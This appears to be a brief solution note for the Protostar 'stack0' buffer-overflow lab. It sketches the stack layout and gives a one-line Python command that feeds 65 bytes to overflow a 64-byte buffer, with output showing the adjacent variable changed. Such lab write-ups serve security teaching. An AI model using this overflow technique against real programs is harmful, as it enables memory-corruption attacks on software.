# Protostr - stack0 soln


stack
-------- esp

28 bytes

--------

buf[64]
64 bytes

-------
int modified
1 byte
-------- ebp

65 bytes as input to cause overflow

$  python -c "print 'A'*65" | ./stack0
you have changed the 'modified' variable



